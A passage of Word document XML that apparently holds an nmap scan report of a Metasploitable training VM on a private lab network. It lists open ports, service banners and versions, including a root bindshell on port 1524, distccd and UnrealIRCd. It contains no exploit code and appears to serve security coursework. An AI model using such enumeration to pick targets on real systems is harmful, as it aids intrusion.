        <w:t>smbd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3.0.20-Debian (workgroup: WORKGROUP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1347B5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512/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  exec</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>netkit-rsh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rexecd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="11B2A68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513/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  login</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0DAC20C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514/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">open  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>tcpwrapped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1F71421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1099/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java-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rmi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    GNU </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Classpath</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>grmiregistry</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5700314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1524/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bindshell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> root shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6E9BD3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2049/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nfs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         2-4 (RPC #100003)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575CC83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2121/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ftp         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ProFTPD</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.3.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7ABD28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3306/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mysql       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5.0.51a-3ubuntu5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B757B7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mysql-info: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CACB31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Protocol: 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085F484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Version: 5.0.51a-3ubuntu5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A63C9C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Thread ID: 8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714144F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Capabilities flags: 43564</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFF97D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Some Capabilities: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>SupportsCompression</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>SupportsTransactions</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">, Speaks41ProtocolNew, Support41Auth, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>SwitchToSSLAfterHandshake</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ConnectWithDatabase</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>LongColumnFlag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3B71D4E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Status: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Autocommit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="19024145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</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_  Salt</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dJ</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>('*;+d:45Me2j?:F3j</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068EBE4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3632/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distccd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>distccd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2549F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5432/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postgresql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  PostgreSQL DB 8.3.0 - 8.3.7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A940CE3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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-date: 2024-11-22T17:10:54+00:00; +3s from scanner time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CBF06C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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-cert: Subject: commonName=ubuntu804-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>base.localdomain</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>countryName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=XX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7772ECF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Not valid before: 2010-03-17T14:07:45</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EFA557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|_Not valid after:  2010-04-16T14:07:45</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34AE837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5900/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vnc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         VNC (protocol 3.3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F5302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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>vnc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">-info: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4571E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Protocol version: 3.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652EAE89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Security types: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEAA9E4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    VNC Authentication (2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27846DC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6000/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X11         (access denied)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E74AFA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6667/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irc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>UnrealIRCd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7D84831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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>irc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">-info: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA71F17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users: 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2960A5A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servers: 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC09C09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spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>lusers</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272EFC55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spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>lservers</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5093147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server: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>irc.Metasploitable.LAN</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="35859717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version: Unreal3.2.8.1. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>irc.Metasploitable.LAN</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6102101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uptime: 0 days, 0:04:22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273122A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lastRenderedPageBreak/>
        <w:t>|   source ident: nmap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230BD6C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source host: 369BCF</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>11.554FE7D2.FFFA</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>6D49.IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183C912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</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_  error</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: Closing Link: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>oemdyawpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">[192.168.10.68] (Quit: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>oemdyawpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66984ED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6697/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irc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>UnrealIRCd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7C16771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8009/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ajp13       Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Jserv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Protocol v1.3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E44C8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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ajp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-methods: Failed to get a valid response for the OPTION request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4559C644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8180/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http        Apache Tomcat/Coyote JSP engine 1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20180103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|_http-server-header: Apache-Coyote/1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53EB8F8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|_http-title: Apache Tomcat/5.5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEF0EA9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|_http-favicon: Apache Tomcat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0412153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8787/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>tcp  open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drb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         Ruby </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>DRb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> RMI (Ruby 1.8; path /usr/lib/ruby/1.8/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>drb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C535E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43198/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">open  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>nlockmgr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    1-4 (RPC #100021)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB0AA1D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45230/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  java</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rmi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    GNU </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Classpath</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>grmiregistry</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="007B0F47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49497/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  status</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      1 (RPC #100024)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C05CA1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59993/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">open  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>mountd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      1-3 (RPC #100005)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5527CAF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MAC Address: 00:0C:</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>29:FA</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:DD:2A (VMware)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A385C4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Service Info: Hosts:  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>metasploitable.localdomain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>irc.Metasploitable.LAN</w:t>
      </w:r>
